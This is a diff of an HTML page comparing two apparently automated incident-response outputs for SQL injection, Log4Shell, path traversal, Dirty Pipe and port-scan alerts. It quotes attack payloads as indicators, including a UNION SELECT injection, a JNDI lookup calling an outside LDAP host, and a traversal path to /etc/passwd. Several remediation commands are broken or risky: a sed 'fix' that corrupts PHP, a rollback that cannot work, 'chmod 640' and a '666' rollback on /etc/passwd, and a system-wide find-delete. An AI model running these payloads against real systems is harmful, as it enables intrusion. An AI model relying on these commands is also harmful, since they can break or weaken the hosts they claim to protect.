@@ -587,49 +587,81 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>【处置方案】
-1. 临时封禁攻击源IP 203.0.113.45
-   - 使用iptables命令：iptables -A INPUT -s 203.0.113.45 -j DROP
-2. 检查目标Web应用（192.168.1.100:80）是否存在SQL注入漏洞，重点排查 /api/user/search 接口
-3. 建议开发团队对相关接口增加参数化查询，避免拼接SQL语句
-4. 后续建议对用户表敏感字段加密存储，提升安全性
-
-【提示】
-- 封禁IP前，可用iptables-save备份策略（命令：iptables-save &gt; /root/iptables-backup-$(date +%F).conf）
-- 此处封禁为临时措施，建议根本修复代码漏洞</pre></div>
+            <div class="solution-content"><pre>【告警名称】SQL注入攻击检测
+【告警时间】2025-12-04 10:15:00
+【攻击源IP】203.0.113.45
+【目标IP】192.168.1.100
+【目标端口】80
+【威胁等级】高危
+【攻击类型】SQL注入
+【漏洞类型】CVE-2024-21732
+【ATT&amp;CK】初始访问:TA0001|利用面向公众的应用:T1190
+【请求URI】/api/user/search?id=1
+【Payload】id=1' UNION SELECT username,password,email FROM users--
+【告警描述】检测到来自203.0.113.45的SQL注入攻击，攻击者尝试通过联合查询获取用户表中的敏感数据，包括用户名、密码和邮箱信息。
+【处置建议】建议封禁攻击源IP，修复SQL注入漏洞，对用户输入进行参数化查询</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>【自动处置Playbook】
-1. 关联CVE-2024-21732分析与补丁方案，确认受影响的应用及版本（详见NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-21732）
-2. 生成封禁命令（含回退与检查）：
-   - 预检查：
-     iptables -C INPUT -s 203.0.113.45 -j DROP &amp;&amp; echo "IP已封禁" || echo "未封禁"
-   - 封禁命令：
-     iptables -I INPUT -s 203.0.113.45 -j DROP
-   - 回退命令（解封）：
-     iptables -D INPUT -s 203.0.113.45 -j DROP
-   - 备份防火墙规则：
-     iptables-save &gt; /root/iptables-backup-$(date +%F).conf
-3. 关联ATT&amp;CK编号初始访问:TA0001、利用面向公众的应用:T1190，建议评估系统是否暴露其他应用接口
-4. 针对/api/user/search接口，建议:
-   - 强制参数化查询或使用ORM
-   - 审计近期数据库访问日志
-   - 验证WAF、RASP是否启用
-5. DevOps流程建议：
-   - 立即推送CVE-2024-21732补丁
-   - 排查易受影响的API endpoints
+            <div class="solution-content"><pre>【告警分类】SQL注入
+【风险等级】🟡 MEDIUM（评分：0.65）
+【处置决策】📋 已创建工单，等待人工审核
 
-【结构化证据】
-- 源IP: 203.0.113.45
-- 目标IP: 192.168.1.100
-- 攻击类型: SQL注入（联合查询）
-- 关联: CVE-2024-21732、ATT&amp;CK T1190
+【事件描述】
+在2025年12月4日上午10:15，检测到一起严重的SQL注入攻击事件。攻击者来自IP地址203.0.113.45，目标是位于192.168.1.100的服务器，攻击通过HTTP端口80进行。攻击者利用CVE-2024-21732漏洞，通过请求URI /api/user/search?id=1，试图执行恶意SQL语句 'id=1' UNION SELECT username,password,email FROM users--'，以获取用户表中的敏感信息，包括用户名、密码和邮箱。这次攻击的威胁等级被评估为高危，可能导致严重的数据泄露。
 
-【注意事项】
-- 封禁IP后需监测代理重试
-- 执行前做好回退与变更审批</pre></div>
+【风控评估】
+R=0.65(medium): 动作0.80+范围0.80+业务0.29 -&gt; ticket
+本次告警被判定为中等风险（综合风险评分：0.65）。已创建工单，需要安全分析师人工审核后决定处置方案。
+
+【处置Playbook】置信度: 0.93
+
+■ 即时缓解措施
+1. 封禁攻击源IP [priority: critical]
+   描述: 在防火墙阻断203.0.113.45的所有入站流量，防止持续攻击
+   执行命令(Linux): iptables -I INPUT -s 203.0.113.45 -j DROP
+   执行命令(Windows): netsh advfirewall firewall add rule name="Block_203.0.113.45" dir=in action=block remoteip=203.0.113.45
+   回退命令(Linux): iptables -D INPUT -s 203.0.113.45 -j DROP
+   回退命令(Windows): netsh advfirewall firewall delete rule name="Block_203.0.113.45"
+   Pre-check: 确认203.0.113.45不是内部合法业务系统或管理终端IP
+
+2. 紧急隔离Web服务端口 [priority: high]
+   描述: 临时关闭80端口防止进一步SQL注入攻击，适用于大规模入侵或数据泄露风险极高时
+   执行命令(Linux): iptables -I INPUT -p tcp --dport 80 -j DROP
+   执行命令(Windows): netsh advfirewall firewall add rule name="Block_HTTP_80" dir=in action=block protocol=TCP localport=80
+   回退命令(Linux): iptables -D INPUT -p tcp --dport 80 -j DROP
+   回退命令(Windows): netsh advfirewall firewall delete rule name="Block_HTTP_80"
+   Pre-check: 确认业务允许短时中断Web服务，通知相关业务方
+
+■ 根因修复方案
+1. 修复SQL注入漏洞（CVE-2024-21732）[priority: critical]
+   描述: 升级Web应用到官方已修复CVE-2024-21732的最新版本，或应用厂商安全补丁
+   执行命令(Linux): cd /var/www/app &amp;&amp; git pull origin master
+   回退命令(Linux): cd /var/www/app &amp;&amp; git reset --hard HEAD~1
+   Pre-check: 在测试环境验证升级兼容性，备份当前Web应用目录和数据库
+
+2. 修正后端SQL查询为参数化查询 [priority: high]
+   描述: 将后端所有涉及用户输入的SQL查询重构为参数化查询，防止注入
+   执行命令(Linux): grep -r --include=*.php 'SELECT.*\$_GET' /var/www/app | tee /tmp/suspect_sql.txt
+   Pre-check: 确保已完整备份应用代码，修正后在测试环境回归测试
+
+■ 预防加固措施
+1. 部署Web应用防火墙（WAF）[priority: high]
+   描述: 在Web服务器前端部署WAF，自动拦截SQL注入等常见Web攻击
+   执行命令(Linux): apt-get install libapache2-mod-security2 &amp;&amp; a2enmod security2 &amp;&amp; systemctl reload apache2
+   回退命令(Linux): a2dismod security2 &amp;&amp; systemctl reload apache2
+   Pre-check: 确认WAF规则不会误拦合法业务流量，先在测试环境模拟攻击验证
+
+2. 限制HTTP接口访问来源 [priority: medium]
+   描述: 仅允许可信源IP访问敏感API接口，减少暴露面
+   执行命令(Linux): iptables -A INPUT -p tcp -s 10.0.0.0/8 --dport 80 -j ACCEPT &amp;&amp; iptables -A INPUT -p tcp --dport 80 -j DROP
+   Pre-check: 确认允许的IP范围覆盖所有合法访问用户和管理终端
+
+3. 加强数据库账户权限最小化 [priority: medium]
+   描述: 确保Web应用数据库账户仅有必要的最小权限，防止攻击者利用注入进一步横向扩展
+   执行命令: mysql -u root -p -e "REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'webuser'@'localhost'; GRANT SELECT,INSERT,UPDATE,DELETE ON dbname.* TO 'webuser'@'localhost';"
+   Pre-check: 确认webuser账户不承担其他高权限业务，变更前备份数据库权限表</pre></div>
         </div>
     </div>
     
@@ -752,72 +784,84 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>处置措施：
-1. 建议立即升级Log4j至2.17.0或以上版本，修复CVE-2021-44228漏洞。
-2. 如无法立即升级，请在jvm启动参数中添加-Dlog4j2.formatMsgNoLookups=true作为临时缓解措施。
-3. 检查服务器10.0.0.50和相关应用日志，确认是否存在异常请求或反向连接。
-4. 封禁攻击源IP（45.33.32.156）：
-   - Linux防火墙命令：
-     iptables -A INPUT -s 45.33.32.156 -j DROP
-5. 建议关注官方安全公告，持续更新安全补丁。
+            <div class="solution-content"><pre>## 事件描述
+2025年12月4日12时，检测到针对内网服务器（10.0.0.50:8080）的Log4j远程代码执行（RCE）攻击。攻击源IP为45.33.32.156，攻击者在/api/login接口的请求头（User-Agent）和参数中注入JNDI Lookup表达式（${jndi:ldap://...}），试图利用Log4j漏洞CVE-2021-44228（Log4Shell）从恶意LDAP服务器加载并执行远程代码。
 
-参考信息：
-- CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228</pre></div>
+## 攻击分类
+- 攻击类型：远程代码执行（RCE）
+- 漏洞利用：Log4j JNDI注入（CVE-2021-44228）
+- ATT&amp;CK框架：TA0002（执行），T1203（利用应用程序漏洞）
+
+## 风险评估
+**风险等级：高**
+- 理由：Log4j漏洞（Log4Shell）为高危RCE漏洞，已被广泛利用。攻击一旦成功，攻击者可远程执行任意代码，控制服务器。
+
+## 处置建议
+
+### 1. 即时缓解措施
+- 立即检查10.0.0.50服务器Log4j版本，若为2.0-2.14.1，立即采取隔离措施
+- 设置JVM参数：-Dlog4j2.formatMsgNoLookups=true
+- 临时封禁可疑攻击源IP（45.33.32.156）
+
+### 2. 根因修复方案
+- 立即将受影响服务的Log4j升级到2.17.0及以上版本
+- 检查所有业务系统及依赖，排查是否存在Log4j组件
+
+### 3. 预防加固措施
+- 对外部接口加强输入过滤和WAF防护
+- 加强对敏感服务器的监控与告警</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>处置方案：
-1. **立即处置措施：**
-   - 临时阻断攻击源IP：
-     ```bash
-     iptables -I INPUT -s 45.33.32.156 -j DROP
-     ```
-     - 回退（撤销）命令：
-     ```bash
-     iptables -D INPUT -s 45.33.32.156 -j DROP
-     ```
-     - 生效检查：
-     ```bash
-     iptables -L INPUT -n | grep 45.33.32.156
-     ```
+            <div class="solution-content"><pre>【告警分类】命令执行/RCE
+【风险等级】🟡 MEDIUM（评分：0.70）
+【处置决策】📋 已创建工单，等待人工审核
 
-2. **漏洞修复建议：**
-   - 立即升级Log4j至2.17.0或更高（CVE-2021-44228）。
-   - 如无法立即升级，添加JVM启动参数缓解（需重启应用）：
-     - Linux配置示例（编辑启动脚本或服务）：
-       ```bash
-       export JAVA_OPTS="$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true"
-       ```
-   - 查看当前Log4j版本与JVM参数命令：
-     ```bash
-     find / -name "log4j*.jar"
-     java -jar log4j-core-*.jar --version
-     ps aux | grep java
-     ```
+【事件描述】
+在2025年12月4日中午12点，一起严重的远程代码执行攻击事件发生。攻击者使用IP地址45.33.32.156，针对目标IP 10.0.0.50的8080端口发起攻击。攻击者利用了CVE-2021-44228漏洞（Log4Shell），通过在请求的User-Agent和参数中注入JNDI Lookup表达式，试图从远程服务器加载恶意类以执行任意代码。
 
-3. **日志和威胁溯源：**
-   - 检查10.0.0.50:/var/log/及应用日志，确认是否已建立恶意连接：
-     ```bash
-     grep -ni 'jndi' /var/log/* 2>/dev/null
-     netstat -anp | grep 1389
-     ```
+【风控评估】
+R=0.70(medium): 动作0.80+范围1.00+业务0.26 -&gt; ticket
+本次告警被判定为中等风险（综合风险评分：0.70）。已创建工单，需要安全分析师人工审核后决定处置方案。
 
-4. **情报关联：**
-   - CVE: CVE-2021-44228
-   - ATT&CK: TA0002（执行）、T1203（利用应用程序漏洞）
-   - IOC:
-     - 攻击源IP: 45.33.32.156
-     - 恶意Payload: ${jndi:ldap://45.33.32.156:1389/Exploit}
+【处置Playbook】置信度: 0.98
 
-5. **业务安全提示：**
-   - 操作前建议备份应用配置和关键数据。
-   - 执行命令须确定兼容当前生产环境，或先在测试环境验证。
-   - 操作带来的访问限制及时与业务团队沟通。
+■ 即时缓解措施
+1. 封禁攻击源IP [priority: critical]
+   描述: 在防火墙阻断攻击源IP 45.33.32.156 的所有入站流量，防止进一步攻击
+   执行命令(Linux): iptables -I INPUT -s 45.33.32.156 -j DROP
+   执行命令(Windows): netsh advfirewall firewall add rule name="Block_45.33.32.156" dir=in action=block remoteip=45.33.32.156
+   回退命令(Linux): iptables -D INPUT -s 45.33.32.156 -j DROP
+   回退命令(Windows): netsh advfirewall firewall delete rule name="Block_45.33.32.156"
+   Pre-check: 确认45.33.32.156不是企业内部或合作伙伴的合法业务IP
 
-参考链接：
-- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
-- [官方升级指南](https://logging.apache.org/log4j/2.x/security.html)</pre></div>
+2. 临时禁用JNDI Lookup功能 [priority: critical]
+   描述: 为受影响的Java服务设置log4j2.formatMsgNoLookups=true，临时关闭危险JNDI功能
+   执行命令(Linux): export LOG4J_FORMAT_MSG_NO_LOOKUPS=true &amp;&amp; systemctl restart tomcat
+   执行命令(Windows): setx LOG4J_FORMAT_MSG_NO_LOOKUPS true &amp;&amp; net stop tomcat &amp;&amp; net start tomcat
+   回退命令(Linux): unset LOG4J_FORMAT_MSG_NO_LOOKUPS &amp;&amp; systemctl restart tomcat
+   回退命令(Windows): setx LOG4J_FORMAT_MSG_NO_LOOKUPS "" &amp;&amp; net stop tomcat &amp;&amp; net start tomcat
+   Pre-check: 确认受影响服务使用Log4j 2.x且未升级到2.17.0及以上；重启服务前已通知业务方
+
+■ 根因修复方案
+1. 升级Log4j至2.17.0或更高版本 [priority: critical]
+   描述: 将所有受影响系统中的Log4j组件升级到2.17.0或更高版本，彻底修复CVE-2021-44228
+   执行命令(Linux): find / -name "log4j-core-*.jar" -exec cp {} {}.bak \; &amp;&amp; wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.17.0/log4j-core-2.17.0.jar -O /path/to/your/app/lib/log4j-core-2.17.0.jar &amp;&amp; systemctl restart tomcat
+   回退命令(Linux): find / -name "log4j-core-2.17.0.jar" -delete &amp;&amp; find / -name "log4j-core-*.jar.bak" -exec mv {} $(echo {} | sed 's/\.bak$//') \; &amp;&amp; systemctl restart tomcat
+   Pre-check: 在测试环境验证升级兼容性，备份原有jar文件，确认业务低峰期操作
+
+■ 预防加固措施
+1. 加固防火墙规则限制8080端口访问 [priority: high]
+   描述: 仅允许可信IP访问8080端口，阻止外部未授权访问
+   执行命令(Linux): iptables -A INPUT -p tcp --dport 8080 -s 10.0.0.0/8 -j ACCEPT &amp;&amp; iptables -A INPUT -p tcp --dport 8080 -j DROP
+   回退命令(Linux): iptables -D INPUT -p tcp --dport 8080 -j DROP
+   Pre-check: 确认10.0.0.0/8覆盖所有合法业务和管理终端
+
+2. 定期扫描并移除高危依赖 [priority: medium]
+   描述: 使用自动化工具定期扫描并报告存在高危漏洞的依赖库，及时清理或替换
+   执行命令(Linux): cd /path/to/your/app &amp;&amp; ./dependency-check.sh --scan . --format ALL
+   Pre-check: 确认依赖检查工具已安装并配置好输出路径</pre></div>
         </div>
     </div>
     
@@ -938,60 +982,94 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>1. 确认web服务器日志中存在异常访问记录，"/download?file=../../../etc/passwd"，并留存证据。
-2. 检查并修复存在目录遍历漏洞的文件下载功能源代码，对"file"参数进行过滤，去除"../"等危险字符。
-3. 限定用户只能访问指定白名单目录下的文件，防止越权。
-4. 建议立即升级Web应用、相关依赖及中间件至最新版本。
-5. 定期进行漏洞扫描和代码审计，排查其他输入参数存在的目录遍历风险。
-6. 主动阻断攻击源IP：iptables -A INPUT -s 185.220.101.50 -j DROP</pre></div>
+            <div class="solution-content"><pre>## 事件描述
+在2025年12月4日13:00，检测到来自IP地址185.220.101.50的攻击流量，攻击目标为192.168.2.100的80端口（HTTP服务）。攻击者通过Web接口（如/download?file=...）尝试利用"目录遍历"漏洞，试图读取服务器上的敏感文件/etc/passwd。
+
+## 攻击分类
+此事件属于**Web应用攻击-目录遍历（Path Traversal）**。攻击者通过构造特殊的文件路径（如../../../etc/passwd），绕过目录限制，访问服务器上本不应开放的文件。
+
+## 风险评估
+**风险等级：高**
+- 原因：攻击目标为常见的敏感文件/etc/passwd，一旦泄露可导致用户信息外泄，为攻击者后续渗透、提权等操作提供条件。
+
+## 处置建议
+
+### 1. 即时缓解措施
+- 立即封禁攻击源IP（185.220.101.50）在防火墙或WAF上
+- 临时关闭或限制/download等相关接口权限
+
+### 2. 根因修复方案
+- 对所有文件访问接口进行严格输入校验和路径规范化处理
+- 明确限定可访问的文件目录，仅允许读取白名单内的文件
+- 使用安全的文件访问函数（如realpath、basename等）过滤路径
+
+### 3. 预防加固措施
+- 部署Web应用防火墙（WAF），开启目录遍历检测规则
+- 定期对Web应用进行安全代码审计和漏洞扫描</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>1. 【证据归集】
-   - 异常请求抓取：/download?file=../../../etc/passwd
-   - 攻击源IP：185.220.101.50
-   - 威胁情报：高风险TOR出口节点（与开源情报吻合）
-   - ATT&CK链路：TA0006（凭证访问）、T1552（不安全的凭证）
-   - 关联IOC：无明显带毒Hash、暂无CVE编号，但符合经典目录遍历利用模式
+            <div class="solution-content"><pre>【告警分类】目录遍历
+【风险等级】🟡 MEDIUM（评分：0.64）
+【处置决策】📋 已创建工单，等待人工审核
 
-2. 【封禁与监控】
-   - 临时拉黑源IP（5分钟有效，便于回退）
-     ```bash
-     iptables -I INPUT -s 185.220.101.50 -j DROP
-     ```
-   - 日志监控命令（排查同源后续行为）
-     ```bash
-     grep '185.220.101.50' /var/log/nginx/access.log
-     ```
-   - 标记此事件为"需关注"，自动添加监控告警策略
+【事件描述】
+在2025年12月4日下午1点，来自IP地址185.220.101.50的攻击者对IP为192.168.2.100的服务器发起了一次高危的目录遍历攻击。攻击者通过发送特制的请求URI '/download?file=../../../etc/passwd'，试图利用路径穿越漏洞访问服务器上的敏感文件/etc/passwd。
 
-3. 【Web服务应急措施】
-   - 检查/download GET接口处理逻辑，增加如下伪代码校验拦截：
-     ```python
-     import os
-     filename = request.args.get('file')
-     if ".." in filename or filename.startswith("/"):
-         abort(400)
-     # 或：只允许白名单目录
-     allowed_dir = "/var/www/download"
-     path = os.path.realpath(os.path.join(allowed_dir, filename))
-     if not path.startswith(allowed_dir):
-         abort(403)
-     ```
-   - 应用更改前建议备份相关配置及源代码。
-   - 变更回退命令：
-     ```bash
-     iptables -D INPUT -s 185.220.101.50 -j DROP
-     ```
-   - 执行前Pre-check：
-     - 检查iptables是否已存在相关规则，避免重复插入；
-     - 验证Nginx日志是否已完整保留；
-     - 评估修复措施对现有业务文件下载流程的影响。
+【风控评估】
+R=0.64(medium): 动作0.80+范围0.80+业务0.28 -&gt; ticket
+本次告警被判定为中等风险（综合风险评分：0.64）。已创建工单，需要安全分析师人工审核后决定处置方案。
 
-4. 【长期建议】
-   - 引用OWASP Top 10 2021-A5 "安全配置缺陷"与A1 "注入"，上线代码审计工具。
-   - 建议启用WAF目录穿越检测规则（如ModSecurity），并持续追踪最新安全公告/补丁。</pre></div>
+【处置Playbook】置信度: 0.95
+
+■ 即时缓解措施
+1. 封禁攻击源IP [priority: critical]
+   描述: 在防火墙阻断恶意源IP 185.220.101.50 的所有入站流量，防止进一步攻击
+   执行命令(Linux): iptables -I INPUT -s 185.220.101.50 -j DROP
+   执行命令(Windows): netsh advfirewall firewall add rule name="Block_185.220.101.50" dir=in action=block remoteip=185.220.101.50
+   回退命令(Linux): iptables -D INPUT -s 185.220.101.50 -j DROP
+   回退命令(Windows): netsh advfirewall firewall delete rule name="Block_185.220.101.50"
+   Pre-check: 确认 185.220.101.50 不是内部或业务相关的IP，避免误封业务流量
+
+2. 隔离受影响Web主机 [priority: high]
+   描述: 临时断开 192.168.2.100 的外部网络连接，防止数据进一步泄露
+   执行命令(Linux): ip link set eth0 down
+   执行命令(Windows): netsh interface set interface "以太网" admin=disable
+   回退命令(Linux): ip link set eth0 up
+   回退命令(Windows): netsh interface set interface "以太网" admin=enable
+   Pre-check: 确认隔离操作不会影响关键业务系统或服务，建议在运维窗口执行
+
+■ 根因修复方案
+1. 修复Web应用路径穿越漏洞 [priority: critical]
+   描述: 修正Web应用的文件下载功能，对输入参数进行路径规范化和白名单校验，防止目录穿越
+   执行命令(Linux): sed -i.bak '/download/ s/\(file=\)\([^&amp;]*\)/\1$(basename \2)/' /path/to/webapp/download_handler.php
+   回退命令(Linux): mv /path/to/webapp/download_handler.php.bak /path/to/webapp/download_handler.php
+   Pre-check: 确认代码修改位置与实际Web服务文件路径一致，并在测试环境验证修复效果
+
+2. 限制Web服务进程文件访问权限 [priority: high]
+   描述: 通过操作系统权限配置，限制Web服务账户对敏感目录（如/etc）的访问
+   执行命令(Linux): chown root:root /etc/passwd &amp;&amp; chmod 640 /etc/passwd &amp;&amp; usermod -s /usr/sbin/nologin www-data
+   回退命令(Linux): chmod 644 /etc/passwd &amp;&amp; usermod -s /bin/bash www-data
+   Pre-check: 确认Web服务账户（如www-data）不需要访问系统敏感文件
+
+■ 预防加固措施
+1. 部署Web应用防火墙（WAF）规则 [priority: high]
+   描述: 在WAF中添加针对目录遍历攻击的检测和拦截规则
+   执行命令(Linux): echo 'SecRule REQUEST_URI "\.\.\/" "id:1001,deny,log,msg:'Path Traversal detected'"' &gt;&gt; /etc/modsecurity/modsecurity.conf &amp;&amp; systemctl reload apache2
+   回退命令(Linux): sed -i '/id:1001,deny,log,msg/d' /etc/modsecurity/modsecurity.conf &amp;&amp; systemctl reload apache2
+   Pre-check: 确认WAF已部署且配置文件路径正确，规则不会误拦合法业务流量
+
+2. 建立文件访问白名单机制 [priority: medium]
+   描述: 仅允许Web应用访问预定义的文件目录，禁止访问任意路径
+   执行命令(Linux): echo '/var/www/html/files/' &gt; /etc/webapp/allowed_dirs.conf &amp;&amp; systemctl reload webapp
+   回退命令(Linux): rm /etc/webapp/allowed_dirs.conf &amp;&amp; systemctl reload webapp
+   Pre-check: 确认业务所需的文件目录全部纳入白名单
+
+3. 加强日志监控与告警 [priority: medium]
+   描述: 对Web访问日志中出现'../'等可疑路径行为进行实时监控和自动告警
+   执行命令(Linux): grep '\.\./' /var/log/nginx/access.log | tee -a /var/log/web_traversal_alert.log
+   Pre-check: 确认日志路径和格式与实际Web服务器配置一致</pre></div>
         </div>
     </div>
     
@@ -1112,60 +1190,90 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>1. 终止可疑进程：
-   ```bash
-   kill -9 $(pgrep -f '/tmp/.exploit_dp')
-   ```
-2. 检查 /etc/passwd 文件是否被修改：
-   ```bash
-   grep '^root:' /etc/passwd
-   ```
-3. 升级内核：
-   - 下载并安装最新的内核补丁，建议升级到5.16.11以上版本。
-4. 建议执行主机全面杀毒和异常账户排查。</pre></div>
+            <div class="solution-content"><pre>## 事件描述
+在2025-12-04 15:30:00，受影响主机192.168.5.100上的低权限用户www-data尝试通过Dirty Pipe漏洞（CVE-2022-0847）对系统进行本地权限提升攻击。攻击者利用/tmp/.exploit_dp恶意进程，执行可疑命令，试图覆写/etc/passwd文件以添加具有root权限的账户。
+
+## 攻击分类
+本地提权攻击（Privilege Escalation），属于利用已知操作系统内核漏洞（CVE-2022-0847，Dirty Pipe）的漏洞利用攻击。
+
+## 风险评估
+风险等级：高  
+理由：Dirty Pipe漏洞可被非特权用户利用直接覆写系统敏感文件（如/etc/passwd），一旦攻击成功，攻击者可获取root权限，完全控制目标主机。
+
+## 处置建议
+
+### 1. 即时缓解措施
+- 立即隔离或断网受影响主机192.168.5.100
+- 终止可疑进程：kill -9 `pidof /tmp/.exploit_dp`
+- 检查并修复/etc/passwd、/etc/shadow等敏感文件
+
+### 2. 根因修复方案
+- 升级Linux内核到5.16.11或更高版本，彻底修复CVE-2022-0847漏洞
+- 检查系统是否存在其他已知高危漏洞并及时修补
+
+### 3. 预防加固措施
+- 对所有服务器定期执行漏洞扫描与补丁管理
+- 限制低权限账户（如www-data）的shell访问权限
+- 配置主机入侵检测（如AIDE、OSSEC）</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>1. 执行前检查（Pre-check）：
-   - 检查当前 /etc/passwd 是否存在异常 root 账号：
-     ```bash
-     grep '^[^:]*:.*:0:0:' /etc/passwd
-     ```
-   - 校验 /etc/passwd 文件哈希值（如有基线）：
-     ```bash
-     sha256sum /etc/passwd
-     ```
-2. 终止恶意进程：
-   ```bash
-   pkill -f '/tmp/.exploit_dp'
-   ```
-3. 临时隔离受影响用户（www-data）：
-   ```bash
-   usermod -L www-data
-   ```
-4. 检查并还原 /etc/passwd（如有备份）：
-   ```bash
-   cp /var/backups/passwd.bak /etc/passwd
-   ```
-   - 若无备份，手工比对root条目，及时修复
-5. 升级Linux内核：
-   - Ubuntu/Debian：
-     ```bash
-     apt update && apt install --only-upgrade linux-image-$(uname -r)
-     ```
-   - CentOS/RHEL：
-     ```bash
-     yum update kernel
-     ```
-   - 重启服务器使补丁生效
-6. 回退措施（Rollback）：
-   - 若因隔离影响业务，可恢复账户：
-     ```bash
-     usermod -U www-data
-     ```
-7. 检查异常登录和反向Shell历史，排查后门
-8. 记录取证，如保存被篡改的 /etc/passwd 以便溯源</pre></div>
+            <div class="solution-content"><pre>【告警分类】权限提升
+【风险等级】🟡 MEDIUM（评分：0.52）
+【处置决策】📋 已创建工单，等待人工审核
+
+【事件描述】
+在2025年12月4日下午3:30，位于192.168.5.100的主机上检测到一起严重的权限提升攻击。攻击者利用CVE-2022-0847漏洞，即著名的Dirty Pipe漏洞，试图通过覆写/etc/passwd文件来提升权限。当前用户www-data正在执行一个名为/tmp/.exploit_dp的可疑进程，并使用可疑命令./exploit_dp /etc/passwd 1 ootz:，意图获取root权限。
+
+【风控评估】
+R=0.52(medium): 动作0.50+范围0.80+业务0.27 -&gt; ticket
+本次告警被判定为中等风险（综合风险评分：0.52）。已创建工单，需要安全分析师人工审核后决定处置方案。
+
+【处置Playbook】置信度: 0.97
+
+■ 即时缓解措施
+1. 终止恶意提权进程 [priority: critical]
+   描述: 立即终止可疑进程/tmp/.exploit_dp，防止进一步权限提升和持久化
+   执行命令(Linux): pkill -f '/tmp/.exploit_dp'
+   执行命令(Windows): taskkill /F /IM exploit_dp.exe
+   回退命令(Linux): 无直接回退，如误杀需重启被影响服务或进程
+   回退命令(Windows): 无直接回退，如误杀需重启被影响服务或进程
+   Pre-check: 确认进程确实为恶意或未授权进程，避免误杀正常业务进程
+
+2. 备份并恢复/etc/passwd文件 [priority: critical]
+   描述: 备份当前/etc/passwd文件，若发现被篡改则用近期备份恢复，防止攻击者已获得root权限
+   执行命令(Linux): cp /etc/passwd /tmp/passwd.bak &amp;&amp; cp /var/backups/passwd.bak /etc/passwd
+   执行命令(Windows): 无对应操作
+   回退命令(Linux): cp /tmp/passwd.bak /etc/passwd
+   回退命令(Windows): 无对应操作
+   Pre-check: 确认/var/backups/passwd.bak为最近且可信备份，且passwd文件确实被篡改
+
+■ 根因修复方案
+1. 升级Linux内核以修复Dirty Pipe漏洞 [priority: critical]
+   描述: 将内核升级到5.16.11或更高版本，彻底修复CVE-2022-0847漏洞
+   执行命令(Linux): yum update kernel -y || apt-get install --only-upgrade linux-image-$(uname -r) -y &amp;&amp; reboot
+   执行命令(Windows): 无对应操作
+   回退命令(Linux): grub2-set-default 0 &amp;&amp; reboot（回退到上一个内核版本）
+   回退命令(Windows): 无对应操作
+   Pre-check: 确认当前业务允许重启，已在测试环境验证升级兼容性
+
+■ 预防加固措施
+1. 限制www-data用户的敏感文件访问权限 [priority: high]
+   描述: 收紧www-data用户对/etc/passwd等敏感文件的权限，减少被利用风险
+   执行命令(Linux): chown root:root /etc/passwd &amp;&amp; chmod 644 /etc/passwd
+   执行命令(Windows): 无对应操作
+   回退命令(Linux): chmod 666 /etc/passwd（如需恢复更宽权限，谨慎操作）
+   回退命令(Windows): 无对应操作
+   Pre-check: 确认应用和服务不依赖更宽权限，避免业务中断
+
+2. 部署入侵检测与日志监控 [priority: medium]
+   描述: 配置auditd等工具实时监控/etc/passwd及可疑进程行为，及时发现未授权操作
+   执行命令(Linux): auditctl -w /etc/passwd -p wa -k passwd_watch
+   执行命令(Windows): 无对应操作
+   回退命令(Linux): auditctl -W /etc/passwd
+   回退命令(Windows): 无对应操作
+   Pre-check: 确认auditd已安装并正常运行，避免对系统性能造成过大影响</pre></div>
         </div>
     </div>
     
@@ -1285,29 +1393,81 @@
     <div class="solutions-container">
         <div class="solution-box">
             <div class="solution-header plan-a">🅰️ 方案A</div>
-            <div class="solution-content"><pre>- 建议在防火墙封禁攻击源IP：185.220.100.250。
-- 检查22、80、443、3306、6379、27017端口是否对外暴露，如无必要应关闭。
-- 定期对外部暴露服务进行漏洞扫描和补丁更新。</pre></div>
+            <div class="solution-content"><pre>## 事件描述
+2025年12月4日18:00，检测到源IP为185.220.100.250的主机针对内网192.168.0.0/16网段发起了大规模端口扫描。扫描对象涵盖了常见的远程管理端口（22）、Web服务端口（80、443）及数据库服务端口（3306、6379、27017）。扫描行为采用了Nmap SYN扫描技术，并检测到User-Agent字段为Mozilla/5.0 zgrab/0.x，表明攻击者使用了自动化工具进行漏洞探测。
+
+## 攻击分类
+- 攻击类型：主动侦察/漏洞扫描（Reconnaissance / Vulnerability Scanning）
+- ATT&amp;CK映射：侦察（TA0043）、主动扫描（T1595）、漏洞扫描（T1595.002）
+
+## 风险评估
+- 风险等级：中危
+- 理由：虽然当前尚未发现后续利用行为，但大规模、自动化的端口和漏洞扫描通常为攻击链的前置环节。
+
+## 处置建议
+
+1. **即时缓解措施**
+   - 立即在边界防火墙、IPS/IDS等设备上封禁源IP：185.220.100.250
+   - 检查防火墙、路由器等边界设备日志，确认是否有更多类似扫描流量
+
+2. **根因修复方案**
+   - 对被扫描端口的服务（SSH、Web、数据库等）进行全面安全加固
+   - 检查所有面向内外网的服务，确保不存在高危漏洞、弱口令、默认账户
+
+3. **预防加固措施**
+   - 部署主动防御系统，如IPS/WAF，自动拦截恶意扫描与攻击行为
+   - 定期开展内部资产自查与渗透测试</pre></div>
         </div>
         
         <div class="solution-box">
             <div class="solution-header plan-b">🅱️ 方案B</div>
-            <div class="solution-content"><pre>- 【处置动作】立即在边界防火墙封禁源IP 185.220.100.250，建议命令（例如Linux iptables）：
-  ```
-  iptables -I INPUT -s 185.220.100.250 -j DROP
-  ```
